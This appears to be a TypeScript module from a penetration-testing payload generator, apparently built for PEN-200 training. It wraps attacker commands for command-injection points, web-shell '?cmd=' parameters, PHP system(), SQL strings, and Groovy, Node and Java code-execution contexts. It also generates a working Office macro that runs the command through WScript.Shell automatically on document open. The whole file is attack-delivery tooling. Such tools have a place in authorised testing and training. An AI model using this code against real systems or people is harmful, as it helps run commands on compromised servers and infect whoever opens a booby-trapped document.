import { sqlQuote, urlEncodeShell } from "./encode";

export type PasteContext =
  | "bash-prompt" | "injected-linux" | "url-param" | "php-system" | "cmd"
  | "powershell" | "webshell-param" | "sql-string" | "macro"
  | "uploaded-file" | "groovy" | "node" | "java";

type Os = "linux" | "windows";

export const PASTE_CONTEXTS: { id: PasteContext; label: string; os: Os | "any" }[] = [
  { id: "bash-prompt", label: "Bash prompt", os: "linux" },
  { id: "injected-linux", label: "Injected command (Linux)", os: "linux" },
  { id: "url-param", label: "URL / form parameter", os: "any" },
  { id: "php-system", label: "PHP system()", os: "linux" },
  { id: "cmd", label: "cmd.exe", os: "windows" },
  { id: "powershell", label: "PowerShell prompt", os: "windows" },
  { id: "webshell-param", label: "Web shell ?cmd=", os: "any" },
  { id: "sql-string", label: "Inside a SQL string", os: "any" },
  { id: "macro", label: "Office macro", os: "windows" },
  { id: "uploaded-file", label: "Uploaded file", os: "any" },
  { id: "groovy", label: "Jenkins / Groovy console", os: "any" },
  { id: "node", label: "Node code", os: "any" },
  { id: "java", label: "Java code", os: "any" },
];

/** Single-quotes for bash -c; an embedded ' becomes '\'' . */
const bashC = (cmd: string) => `bash -c '${cmd.replace(/'/g, `'\\''`)}'`;

/**
 * PEN-200 form: Str built in short chunks, run through WScript.Shell. Inside a VBA string only " needs escaping (doubled);
 * & is literal there. A line break cannot sit in a VBA string, so each one becomes its own `Str = Str + vbCrLf` line.
 */
function vbaMacro(cmd: string): string {
  const lines: string[] = [];
  cmd.split(/\r\n|\r|\n/).forEach((line, n) => {
    if (n > 0) lines.push("    Str = Str + vbCrLf");
    for (let i = 0; i < line.length; i += 50) {
      lines.push(`    Str = Str + "${line.slice(i, i + 50).replace(/"/g, '""')}"`);
    }
  });
  return [
    "Sub MyMacro()", "    Dim Str As String", ...lines,
    '    CreateObject("Wscript.Shell").Run Str', "End Sub", "",
    "Sub AutoOpen()", "    MyMacro", "End Sub", "",
    "Sub Document_Open()", "    MyMacro", "End Sub",
  ].join("\n");
}

interface Wrapper {
  /** `keep`: placeholders still unfilled, left readable by a URL encoding. */
  apply: (cmd: string, os: Os, keep: readonly string[]) => string;
  note: (os: Os) => string;
}

const urlWrap: Wrapper = {
  apply: (cmd, os, keep) => urlEncodeShell(os === "linux" ? bashC(cmd) : cmd, keep),
  note: (os) => (os === "linux" ? "Wrapped in bash -c '...', then URL-encoded (spaces as +)." : "URL-encoded (spaces as +)."),
};

const WRAPPERS: Record<PasteContext, Wrapper> = {
  "bash-prompt": { apply: (c) => c, note: () => "Pasted as-is at a real bash prompt." },
  "injected-linux": {
    // Only a Linux payload gets bash -c; an any-OS def built for Windows is left as it is.
    apply: (c, os) => (os === "linux" ? bashC(c) : c),
    note: (os) => (os === "linux" ? "Wrapped in bash -c '...' because the injection point is not a bash prompt." : "Not wrapped: bash -c is for Linux payloads."),
  },
  "url-param": urlWrap,
  "webshell-param": urlWrap,
  "php-system": {
    // PHP system() runs /bin/sh -c (dash on Debian/Ubuntu), so Linux commands get bash -c first.
    apply: (c, os) => {
      const inner = os === "linux" ? bashC(c) : c;
      return `system('${inner.replace(/[\\']/g, "\\$&")}');`;
    },
    note: (os) => (os === "linux" ? "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped." : "Placed in a single-quoted PHP string; \\ and ' escaped."),
  },
  cmd: { apply: (c) => c, note: () => "Pasted as-is at cmd.exe." },
  powershell: { apply: (c) => c, note: () => "Pasted as-is at a PowerShell prompt." },
  "sql-string": { apply: sqlQuote, note: () => "Single quotes doubled for a SQL string literal." },
  "uploaded-file": { apply: (c) => c, note: () => "Saved as a file and uploaded; nothing is wrapped." },
  groovy: { apply: (c) => c, note: () => "Pasted into the Groovy console as-is." },
  node: { apply: (c) => c, note: () => "Runs as Node code (RCE or SSTI in a Node template)." },
  java: { apply: (c) => c, note: () => "Runs as Java (deserialisation or expression-language RCE)." },
  macro: { apply: vbaMacro, note: () => "Office macro: paste into the VBA editor. The command is split into 50-character chunks (VBA lines max ~1023), \" doubled and line breaks as vbCrLf, and run by AutoOpen/Document_Open." },
};

/** Rewrites a payload so it works as pasted in the given context; `keep` names unfilled placeholders to leave readable. */
export function wrapForContext(cmd: string, ctx: PasteContext, os: Os, keep: readonly string[] = []): { text: string; notes: string[] } {
  const w = WRAPPERS[ctx];
  return { text: w.apply(cmd, os, keep), notes: [w.note(os)] };
}
